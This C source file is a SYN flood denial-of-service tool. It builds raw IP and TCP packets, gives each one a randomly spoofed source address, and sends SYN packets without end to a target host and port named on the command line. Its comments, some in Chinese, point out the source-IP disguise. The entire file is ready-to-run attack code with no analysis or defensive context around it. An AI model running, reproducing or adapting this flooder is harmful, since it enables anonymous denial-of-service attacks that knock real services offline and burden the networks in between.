#include<stdio.h> //printf
#include<string.h> //memset
#include<stdlib.h> //for exit(0);
#include<sys/socket.h>
#include<errno.h> //For errno - the error number
#include<pthread.h>
#include<netdb.h> //hostend
#include<arpa/inet.h>
#include<netinet/tcp.h> //Provides declarations for tcp header
#include<netinet/ip.h> //Provides declarations for ip header
unsigned short csum(unsigned short * , int );
//Datagram to represent the packet
char datagram[4096];
//IP header
struct iphdr *iph = (struct iphdr *) datagram;
//TCP header
struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
struct sockaddr_in dest;
struct pseudo_header psh;
struct pseudo_header //needed for checksum calculation
{
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
    struct tcphdr tcp;
};
/*
Checksums - IP and TCP
*/
unsigned short csum(unsigned short *ptr,int nbytes)
{
    register long sum;
    unsigned short oddbyte;
    register short answer;
    sum=0;
    while(nbytes>1) {
    sum+=*ptr++;
    nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
    return(answer);
}
struct in_addr dest_ip;
int main(int argc, char *argv[])
{
    //Create a raw socket
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0)
    {
        printf ("Error creating socket. Error number : %d . Error message : %s \n" , errno , strerror(errno));
        exit(0);
    }
    else
    {
        printf("Socket created.\n");
    }

    char *target = argv[1];
    if(argc < 3)
    {
        printf("Please specify a hostname and a port \n");
        exit(1);
    }
    //get the target ip
    dest_ip.s_addr = inet_addr( target );
    //IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) <0)
    {
        printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
        exit(0);
    }
    while(1)
    {
    struct in_addr sour_ip;
    int source_port = 8888;
    sour_ip.s_addr = random();
    memset (datagram, 0, 4096); /* zero out the buffer */
    //Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);//40
    iph->id = htons(54321); //0
    iph->frag_off = htons(16384);//0
    iph->ttl = 64;//默认最大255
    iph->protocol = IPPROTO_TCP;
    iph->check = 0; //校验和
    iph->saddr = sour_ip.s_addr; //源IP伪装
    iph->daddr = dest_ip.s_addr; //目标地址
    iph->check = csum ((unsigned short *) datagram,iph->tot_len >> 1);
    //TCP Header
    tcph->source = htons(source_port);//源端口
    tcph->dest = htons(atoi(argv[2]));
    tcph->seq = htonl(1105024978);//随便写，但必须写
    tcph->ack_seq = 0;
    tcph->doff = sizeof(struct tcphdr) / 4; //TCP偏移开始的位置，5
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htons(14600); // 最大，0
    tcph->check = 0; 
    tcph->urg_ptr = 0;
    tcph->check = csum ((unsigned short *) datagram,iph->tot_len >> 1); 
    psh.source_address = sour_ip.s_addr;
    psh.dest_address = dest.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons( sizeof(struct tcphdr));
    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
    tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = dest_ip.s_addr;
    //Send the packet
    if ( sendto (s, datagram , sizeof(struct iphdr) + sizeof(struct tcphdr) , 0 , (struct sockaddr *) &dest, sizeof (dest)) < 0)
    {
        printf ("Error sending syn packet. Error number : %d .Error message : %s \n" , errno , strerror(errno));
        exit(0);
    } else
    {
        char addr_p[INET_ADDRSTRLEN];
        inet_ntop(AF_INET,&sour_ip,addr_p,sizeof(addr_p));
        printf("random IP %s have sended the package.\n",addr_p);
    }
    }
    return 0;
    }